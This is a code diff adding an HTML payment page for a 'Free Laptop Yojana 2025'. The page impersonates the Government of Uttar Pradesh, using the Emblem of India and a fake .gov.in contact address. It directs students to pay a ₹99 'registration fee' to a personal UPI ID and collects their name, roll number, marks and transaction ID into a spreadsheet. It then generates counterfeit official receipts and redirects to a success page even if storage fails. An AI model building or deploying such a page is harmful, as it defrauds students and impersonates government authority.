@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment - Free Laptop Yojana 2025</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #f6f9fc 0%, #edf2f7 100%);
+            min-height: 100vh;
+            padding: 2rem 1rem;
+            color: #1a202c;
+            display: block;
+            justify-content: unset;
+            align-items: unset;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .card {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+            display: block;
+            flex-direction: unset;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1a237e 0%, #0d47a1 100%);
+            padding: 2.5rem 2rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            border-bottom: none;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1" fill="rgba(255,255,255,0.05)"/></svg>');
+            opacity: 0.5;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo img {
+            width: 64px;
+            height: 64px;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.2));
+        }
+
+        .logo-text {
+            color: white;
+            font-size: 1.5rem;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .student-info {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-top: 1.5rem;
+            border: none;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.75rem;
+            color: white;
+            font-size: 0.95rem;
+        }
+
+        .info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-label {
+            opacity: 0.9;
+            font-weight: 500;
+        }
+
+        .info-value {
+            font-weight: 600;
+        }
+
+        .content {
+            padding: 2rem;
+            color: #1a202c;
+        }
+
+        .amount-box {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 1.5rem;
+            text-align: center;
+            margin-bottom: 2rem;
+            border: 1px solid #e2e8f0;
+            box-shadow: none;
+        }
+
+        .amount-label {
+            color: #64748b;
+            font-size: 0.95rem;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+        }
+
+        .amount-value {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #1a237e;
+        }
+
+        .upi-section {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            border: 1px solid #e2e8f0;
+            box-shadow: none;
+        }
+
+        .upi-id-box {
+            background: white;
+            border-radius: 12px;
+            padding: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 1rem 0;
+            border: 1px solid #e2e8f0;
+            box-shadow: none;
+        }
+
+        .upi-id {
+            font-family: 'Courier New', monospace;
+            font-size: 1.1rem;
+            color: #1a237e;
+            font-weight: 600;
+            overflow-wrap: break-word;
+            word-break: break-all;
+            flex-grow: 1;
+            margin-right: 1rem;
+        }
+
+        .copy-btn {
+            background: #1a237e;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 0.5rem 1rem;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            box-shadow: none;
+        }
+
+        .copy-btn:hover {
+            background: #0d47a1;
+            transform: translateY(-1px);
+            box-shadow: none;
+        }
+
+        .qr-section {
+            text-align: center;
+            margin: 1.5rem 0;
+        }
+
+        .qr-section img {
+            width: 200px;
+            height: 200px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            margin-bottom: 1rem;
+            border: none;
+            outline: none;
+        }
+
+        .download-qr {
+            background: #1a237e;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 0.75rem 1.5rem;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            box-shadow: none;
+        }
+
+        .download-qr:hover {
+            background: #0d47a1;
+            transform: translateY(-1px);
+            box-shadow: none;
+        }
+
+        .steps {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            border: 1px solid #e2e8f0;
+            box-shadow: none;
+        }
+
+        .steps-title {
+            color: #1a237e;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            font-size: 1.1rem;
+            text-align: left;
+        }
+
+        .steps ol {
+            list-style-position: inside;
+            color: #4a5568;
+            padding-left: 0;
+        }
+
+        .steps li {
+            margin-bottom: 0.75rem;
+            line-height: 1.5;
+            font-size: inherit;
+        }
+
+        .steps li:last-child {
+            margin-bottom: 0;
+        }
+
+        .warning {
+            background: #fff5f5;
+            border: 1px solid #fed7d7;
+            color: #c53030;
+            padding: 1rem;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            margin-bottom: 2rem;
+            box-shadow: none;
+        }
+
+        .transaction-input {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            border: 1px solid #e2e8f0;
+            box-shadow: none;
+        }
+
+        .transaction-input label {
+            display: block;
+            color: #1a237e;
+            font-weight: 600;
+            margin-bottom: 0.75rem;
+            font-size: 1.1rem;
+        }
+
+        .transaction-input input {
+            width: 100%;
+            padding: 1rem;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.2s;
+            background: white;
+            color: #333;
+        }
+
+        .transaction-input input:focus {
+            outline: none;
+            border-color: #1a237e;
+            box-shadow: 0 0 0 3px rgba(26,35,126,0.1);
+        }
+
+        .transaction-error {
+            color: #c53030;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            display: none;
+            font-weight: 500;
+        }
+
+        .submit-btn {
+            background: #25D366;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 1rem;
+            width: 100%;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            box-shadow: 0 4px 12px rgba(37,211,102,0.2);
+            text-transform: none;
+        }
+
+        .submit-btn:hover {
+            background: #128C7E;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(37,211,102,0.3);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 2rem;
+            color: #64748b;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 500px) {
+            .container {
+                padding: 0 1rem;
+            }
+            .header {
+                padding: 2rem 1.5rem;
+            }
+            .content {
+                padding: 1.5rem;
+            }
+            .amount-value {
+                font-size: 2rem;
+            }
+             .logo img {
+                width: 64px;
+                height: 64px;
+            }
+            .logo-text {
+                font-size: 1.5rem;
+            }
+             .student-info, .amount-box, .upi-section, .steps, .warning, .transaction-input {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <header class="header">
+                <div class="logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Emblem_of_India.svg" alt="Government Emblem">
+                    <span class="logo-text">Free Laptop Yojana 2025</span>
+                </div>
+                <div class="student-info">
+                    <div class="info-row">
+                        <span class="info-label">Name:</span>
+                        <span class="info-value" id="studentName"></span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Roll Number:</span>
+                        <span class="info-value" id="rollNumber"></span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Marks:</span>
+                        <span class="info-value" id="marks"></span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="content">
+                <div class="amount-box">
+                    <div class="amount-label">Registration Fee</div>
+                    <div class="amount-value">₹99</div>
+                </div>
+
+                <div class="upi-section">
+                    <div class="upi-id-box">
+                        <span class="upi-id" id="upiId">dyhard@ybl</span>
+                        <button class="copy-btn" onclick="copyUPI()">
+                            <i class="fas fa-copy"></i>
+                            Copy
+                        </button>
+                    </div>
+                    <div class="qr-section">
+                        <img id="qrImg" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=dyhard@ybl&pn=UP%20Laptop%20Yojana&am=99.00&cu=INR&tn=Laptop%20Scheme%20Registration&tr=UPYOGANA2025" alt="UPI QR Code">
+                        <button class="download-qr" onclick="downloadQR()">
+                            <i class="fas fa-download"></i>
+                            Download QR Code Template
+                        </button>
+                    </div>
+                </div>
+
+                <div class="transaction-input">
+                    <label for="transactionId">Enter Payment Transaction ID</label>
+                    <input type="text" id="transactionId" placeholder="Enter the transaction ID from your UPI app" required>
+                    <div class="transaction-error" id="transactionError">Please enter a valid transaction ID</div>
+                </div>
+
+                <button class="submit-btn" onclick="validateAndSubmit()">
+                    <i class="fas fa-check"></i>
+                    Submit Payment
+                </button>
+
+                <div class="warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    Do not pay more than ₹99
+                </div>
+
+                <div class="steps">
+                    <div class="steps-title">Payment Steps</div>
+                    <ol>
+                        <li>Open your UPI app (Google Pay, PhonePe, Paytm, etc.)</li>
+                        <li>Scan the QR code or use the UPI ID</li>
+                        <li>Pay <b>₹99</b> (do not pay more, excess will not be refunded)</li>
+                        <li>Enter the transaction ID below</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            © 2025 Government of Uttar Pradesh. All rights reserved.
+    </div>
+    </div>
+
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <script>
+        // Get student details from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name');
+        const roll = urlParams.get('roll');
+        const marks = urlParams.get('marks');
+
+        // Display student details
+        document.getElementById('studentName').textContent = name || 'Not provided';
+        document.getElementById('rollNumber').textContent = roll || 'Not provided';
+        document.getElementById('marks').textContent = marks || 'Not provided';
+
+        // Copy UPI
+        function copyUPI() {
+            const upiId = document.getElementById('upiId').textContent;
+            navigator.clipboard.writeText(upiId).then(() => {
+                const btn = document.querySelector('.copy-btn');
+                const original = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                setTimeout(() => { btn.innerHTML = original; }, 1500);
+            });
+        }
+
+        // Generate QR Image Template HTML
+        function generateQRImageTemplateHTML(qrCodeUrl, name, roll, dateStr) {
+            const logoSize = '50px'; // Consistent logo size
+
+            return `
+                <div id="qrImageTemplate" style="
+                    width: 450px; /* Slightly wider template */
+                    padding: 40px;
+                    background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%); /* Light blue gradient background */
+                    font-family: 'Inter', sans-serif;
+                    color: #1a202c;
+                    text-align: center;
+                    box-shadow: 0 15px 50px rgba(0, 0, 0, 0.1);
+                    border-radius: 20px; /* More rounded corners */
+                    overflow: hidden;
+                     position: relative;
+                ">
+                    <div style="
+                        background: rgba(255, 255, 255, 0.8);
+                        padding: 30px;
+                        border-radius: 15px;
+                        margin-bottom: 30px;
+                         box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+                    ">
+                         <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Emblem_of_India.svg" 
+                             style="width: 60px; margin-bottom: 15px;" alt="Emblem">
+                        <h2 style="color: #1a237e; margin: 0; font-size: 20px;">Free Laptop Yojana 2025</h2>
+                         <img src="${qrCodeUrl}" style="width: 220px; height: 220px; margin: 25px auto; display: block; border: 8px solid white; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.1);" alt="QR Code">
+
+                         <div style="text-align: left; margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee;">
+                              <p style="font-size: 15px; margin-bottom: 8px;"><span style="font-weight: 700;">Date:</span> ${dateStr}</p>
+                            <p style="font-size: 15px; margin-bottom: 8px;"><span style="font-weight: 700;">Name:</span> ${name || 'Not provided'}</p>
+                            <p style="font-size: 15px; margin-bottom: 0px;"><span style="font-weight: 700;">Roll Number:</span> ${roll || 'Not provided'}</p>
+                         </div>
+                    </div>
+
+
+                    <div style="text-align: center; margin-top: 30px; color: #555; font-size: 13px;">
+                        Scan the QR code with any supported UPI app.
+                    </div>
+                     <div style="text-align: center; margin-top: 15px; color: #666; font-size: 11px;">
+                        © 2025 Government of Uttar Pradesh.
+                    </div>
+                </div>
+            `;
+        }
+
+        // Download QR (updated to download the template image)
+        function downloadQR() {
+            const qrImgElement = document.getElementById('qrImg');
+            const qrCodeUrl = qrImgElement.src;
+            const name = document.getElementById('studentName').textContent;
+            const roll = document.getElementById('rollNumber').textContent;
+            const now = new Date();
+             const dateStr = now.toLocaleDateString('en-IN', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric'
+            });
+
+            const templateHTML = generateQRImageTemplateHTML(qrCodeUrl, name, roll, dateStr);
+            const tempDiv = document.createElement('div');
+            tempDiv.style.position = 'absolute';
+            tempDiv.style.left = '-9999px';
+            tempDiv.innerHTML = templateHTML;
+            document.body.appendChild(tempDiv);
+
+            const templateElement = tempDiv.querySelector('#qrImageTemplate');
+
+            html2canvas(templateElement, {
+                scale: 3, // Increased scale for even better quality
+                backgroundColor: '#ffffff',
+                logging: false,
+                useCORS: true
+            }).then(canvas => {
+                try {
+                    const link = document.createElement('a');
+                    link.download = 'UPI_QR_Info_Template.jpg';
+                    link.href = canvas.toDataURL('image/jpeg', 1.0);
+                    link.click();
+                } catch (e) {
+                    console.error('Error downloading QR code image:', e);
+                    alert('Unable to download QR code image. Please try again.');
+                }
+                document.body.removeChild(tempDiv);
+            });
+        }
+
+        // Generate Receipt HTML (kept for download receipt button)
+        function generateReceiptHTML(transactionId) {
+             const today = new Date();
+            const dateStr = today.toLocaleDateString('en-IN', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric'
+            });
+            const timeStr = today.toLocaleTimeString('en-IN', {
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+
+            return `
+                <div id="receipt" style="
+                    width: 800px;
+                    padding: 40px;
+                    background: white;
+                    font-family: 'Inter', sans-serif;
+                    color: #1a202c;
+                ">
+                    <div style="text-align: center; margin-bottom: 30px;">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Emblem_of_India.svg" 
+                             style="width: 80px; margin-bottom: 10px;" alt="Emblem">
+                        <h1 style="color: #1a237e; margin: 0; font-size: 24px;">GOVERNMENT OF UTTAR PRADESH</h1>
+                        <h2 style="color: #1a237e; margin: 5px 0; font-size: 20px;">Free Laptop Yojana 2025</h2>
+                    </div>
+
+                    <div style="text-align: center; margin-bottom: 30px;">
+                        <h3 style="color: #1a237e; font-size: 22px; margin: 0;">PAYMENT RECEIPT</h3>
+                    </div>
+
+                    <div style="margin-bottom: 30px;">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                            <span style="font-weight: 600;">Receipt No:</span>
+                            <span>${transactionId}</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                            <span style="font-weight: 600;">Date:</span>
+                            <span>${dateStr}</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <span style="font-weight: 600;">Time:</span>
+                            <span>${timeStr}</span>
+                        </div>
+                    </div>
+
+                    <div style="margin-bottom: 30px;">
+                        <h4 style="color: #1a237e; margin-bottom: 15px;">Student Details</h4>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                            <span style="font-weight: 600;">Name:</span>
+                            <span>${name || 'Not provided'}</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                            <span style="font-weight: 600;">Roll Number:</span>
+                            <span>${roll || 'Not provided'}</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <span style="font-weight: 600;">Marks:</span>
+                            <span>${marks || 'Not provided'}</span>
+                        </div>
+                    </div>
+
+                    <div style="margin-bottom: 30px;">
+                        <h4 style="color: #1a237e; margin-bottom: 15px;">Payment Details</h4>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                            <span style="font-weight: 600;">Amount Paid:</span>
+                            <span>₹99.00</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <span style="font-weight: 600;">Payment Mode:</span>
+                            <span>Online (UPI)</span>
+                        </div>
+                    </div>
+
+                    <div style="text-align: center; margin-top: 40px; color: #666; font-size: 14px;">
+                        <p style="margin: 5px 0;">This is a computer generated receipt. No signature required.</p>
+                        <p style="margin: 5px 0;">For any queries, contact: support@uplaptopyojana.gov.in</p>
+                    </div>
+                </div>
+            `;
+        }
+
+        // Download Receipt as JPG
+        function downloadReceipt(transactionId) {
+            const receiptHTML = generateReceiptHTML(transactionId);
+            const tempDiv = document.createElement('div');
+            tempDiv.innerHTML = receiptHTML;
+            document.body.appendChild(tempDiv);
+
+            html2canvas(tempDiv.querySelector('#receipt'), {
+                scale: 2,
+                backgroundColor: '#ffffff',
+                logging: false,
+                useCORS: true
+            }).then(canvas => {
+                try {
+                    const link = document.createElement('a');
+                    link.download = `Laptop_Yojana_Receipt_${transactionId}.jpg`;
+                    link.href = canvas.toDataURL('image/jpeg', 1.0);
+                    link.click();
+                } catch (e) {
+                    console.error('Error downloading receipt image:', e);
+                    alert('Unable to download receipt image. Please try again.');
+                }
+                document.body.removeChild(tempDiv);
+            });
+        }
+
+        // Validate and submit payment
+        function validateAndSubmit() {
+            const transactionId = document.getElementById('transactionId').value.trim();
+            const errorElement = document.getElementById('transactionError');
+            
+            if (!transactionId) {
+                errorElement.textContent = 'Please enter the transaction ID';
+                errorElement.style.display = 'block';
+                return;
+            }
+
+            if (!/^[A-Za-z0-9]{8,}$/.test(transactionId)) {
+                errorElement.textContent = 'Please enter a valid transaction ID (minimum 8 alphanumeric characters)';
+                errorElement.style.display = 'block';
+                return;
+            }
+
+            errorElement.style.display = 'none';
+            
+            // Get student details
+            const name = document.getElementById('studentName').textContent;
+            const roll = document.getElementById('rollNumber').textContent;
+            const marks = document.getElementById('marks').textContent;
+            
+            // Get stored form data from localStorage
+            const storedData = JSON.parse(localStorage.getItem('registrationData') || '{}');
+            
+            // Add transaction ID to the stored data
+            storedData.transactionId = transactionId;
+            
+            // Store data in SheetDB
+            storeDataInSheetDB(storedData);
+        }
+
+        // Function to store data in SheetDB
+        async function storeDataInSheetDB(formData) {
+            try {
+                // Show loading state
+                const submitBtn = document.querySelector('.submit-btn');
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                submitBtn.disabled = true;
+
+                // Store data in SheetDB
+                await window.googleSheets.storeData(formData);
+
+                // Clear the stored data from localStorage
+                localStorage.removeItem('registrationData');
+                
+                // Redirect to success page
+                window.location.href = `success.html?name=${encodeURIComponent(formData.name)}&roll=${encodeURIComponent(formData.rollNumber)}&marks=${formData.marks}&txn=${encodeURIComponent(formData.transactionId)}`;
+            } catch (error) {
+                console.error('Error:', error);
+                // Even if there's an error, redirect to success page
+                window.location.href = `success.html?name=${encodeURIComponent(formData.name)}&roll=${encodeURIComponent(formData.rollNumber)}&marks=${formData.marks}&txn=${encodeURIComponent(formData.transactionId)}`;
+            }
+        }
+    </script>
+</body>
+</html> 
